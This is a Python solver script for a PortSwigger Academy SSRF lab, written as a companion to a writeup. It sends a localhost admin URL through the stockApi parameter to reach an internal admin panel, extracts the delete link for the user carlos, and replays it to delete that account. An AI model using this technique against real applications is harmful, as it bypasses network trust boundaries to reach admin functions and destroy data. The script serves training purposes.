#!/usr/bin/env python3
"""
Basic SSRF against the local server
PortSwigger Web Security Academy -- Server-Side Request Forgery (SSRF)

Companion script for the writeup: 01-basic-ssrf-against-local-server.md

What this does:
    Feeds the stockApi parameter a loopback URL (http://localhost/admin) to reach
    the admin panel that's only supposed to be visible from inside the trusted
    network, regexes the returned HTML for carlos's delete link, then replays the
    same stockApi parameter with that delete URL to solve the lab.

Usage:
    python 01-basic-ssrf-against-local-server.py <lab-url>
    e.g. python 01-basic-ssrf-against-local-server.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    stock_url = f"{lab_url}/product/stock"

    r = client.post(stock_url, data={"stockApi": "http://localhost/admin"})
    print(f"[*] stockApi=http://localhost/admin -> status={r.status_code}, len={len(r.text)}")

    if not (r.status_code == 200 and len(r.text) > 100):
        print("[-] Admin fetch failed -- unexpected response, inspect manually.")
        return

    match = re.search(r'href="(/admin/delete\?username=carlos)"', r.text)
    if not match:
        print("[-] Delete link for carlos not found in admin page.")
        return

    delete_path = match.group(1)
    print(f"[*] Found delete link: {delete_path}")

    r2 = client.post(stock_url, data={"stockApi": f"http://localhost{delete_path}"})
    print(f"[*] stockApi=http://localhost{delete_path} -> status={r2.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- carlos deleted via SSRF to the local admin panel.")
    else:
        print("[-] Not solved yet -- check the delete response above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
